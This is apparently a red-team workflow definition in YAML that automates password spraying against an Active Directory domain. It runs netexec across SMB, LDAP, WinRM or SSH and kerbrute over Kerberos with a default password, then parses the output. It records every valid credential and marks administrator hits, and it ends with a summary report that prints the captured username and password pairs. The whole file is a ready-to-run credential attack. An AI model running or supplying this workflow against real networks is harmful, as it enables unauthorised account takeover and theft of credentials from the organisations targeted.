# yaml-language-server: $schema=~/.ofx/workflow_schema.json
name: password-spray
description: >
  Password spraying — tests a list of passwords against discovered user accounts across multiple
  protocols with configurable timing.
tags: [redteam, ad, brute, spray, credentials]

dispatch:
  inputs:
    target:
      required: true
      type: string
      description: Target host or DC
    domain:
      required: true
      type: string
      description: Domain name
    users_file:
      required: true
      type: string
      description: Path to username list file
    password:
      type: string
      default: "Password123!"
      description: Password to spray
    protocol:
      type: string
      default: "smb"
      description: "Protocol: smb, ldap, winrm, ssh"

jobs:
  spray-smb:
    name: "Protocol Spray (netexec)"
    steps:
      - name: nxc-spray
        run: |
          netexec {{ inputs.protocol }} {{ inputs.target }} -u {{ inputs.users_file }} -p '{{ inputs.password }}' -d {{ inputs.domain }} --continue-on-success 2>/dev/null | tee /tmp/nxc-spray.txt
        continue-on-error: true

      - name: collect-smb-hits
        script: |
          import re

          valid_creds = []
          try:
              with open('/tmp/nxc-spray.txt') as f:
                  for line in f:
                      if '[+]' in line or 'Pwn3d!' in line:
                          match = re.search(r'(\S+?)\\(\S+?):(\S+)', line)
                          if match:
                              valid_creds.append({
                                  'domain': match.group(1),
                                  'username': match.group(2),
                                  'password': match.group(3),
                                  'pwned': 'Pwn3d!' in line,
                              })
          except FileNotFoundError:
              pass

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"smb_hits={len(valid_creds)}\n")
              for cred in valid_creds:
                  status = " [ADMIN]" if cred['pwned'] else ""
                  f.write(f"smb_cred={cred['domain']}\\{cred['username']}:{cred['password']}{status}\n")

          print(f"netexec spray: {len(valid_creds)} valid credentials found")
          for cred in valid_creds:
              status = " [ADMIN]" if cred['pwned'] else ""
              print(f"  [+] {cred['domain']}\\{cred['username']}:{cred['password']}{status}")

  spray-kerberos:
    name: "Kerberos Spray (kerbrute)"
    steps:
      - name: kerbrute-spray
        run: |
          kerbrute passwordspray --dc {{ inputs.target }} -d {{ inputs.domain }} {{ inputs.users_file }} '{{ inputs.password }}' 2>/dev/null | tee /tmp/kerbrute-spray.txt
        continue-on-error: true

      - name: collect-kerb-hits
        script: |
          import re

          kerb_creds = []
          try:
              with open('/tmp/kerbrute-spray.txt') as f:
                  for line in f:
                      match = re.search(r'VALID LOGIN:\s+(\S+)@', line)
                      if match:
                          kerb_creds.append(match.group(1))
          except FileNotFoundError:
              pass

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"kerb_hits={len(kerb_creds)}\n")
              f.write(f"kerb_valid_users={chr(10).join(kerb_creds)}\n")

          print(f"Kerberos spray: {len(kerb_creds)} valid logins")
          for user in kerb_creds:
              print(f"  [+] {user}@{{ inputs.domain }}")

  results:
    name: "Spray Results Summary"
    needs: [spray-smb, spray-kerberos]
    steps:
      - name: collect-results
        script: |
          all_users = set()

          # Collect from netexec
          smb_hits = int('{{ jobs["spray-smb"].outputs.smb_hits | default("0", true) }}')
          kerb_hits = int('{{ jobs["spray-kerberos"].outputs.kerb_hits | default("0", true) }}')

          kerb_users = '{{ jobs["spray-kerberos"].outputs.kerb_valid_users | default("", true) }}'
          for u in kerb_users.strip().split('\n'):
              if u.strip():
                  all_users.add(u.strip())

          with open('{{ env.OFX_OUTPUTS }}', 'a') as f:
              f.write(f"total_hits={smb_hits + kerb_hits}\n")
              f.write(f"unique_users={len(all_users)}\n")

          print(f"Total valid credentials: {smb_hits + kerb_hits}")
          print(f"Unique compromised users: {len(all_users)}")

      - name: report
        run: |
          echo "======================================================"
          echo " PASSWORD SPRAY COMPLETE: {{ inputs.target }}"
          echo " Domain: {{ inputs.domain }}"
          echo " Password: {{ inputs.password }}"
          echo " Protocol: {{ inputs.protocol }}"
          echo "======================================================"
          echo ""
          echo "--- Results ---"
          echo "netexec ({{ inputs.protocol }}) hits: {{ jobs['spray-smb'].outputs.smb_hits }}"
          echo "Kerberos hits: {{ jobs['spray-kerberos'].outputs.kerb_hits }}"
          echo "Total valid: {{ steps[0].outputs.total_hits }}"
          echo "Unique users: {{ steps[0].outputs.unique_users }}"
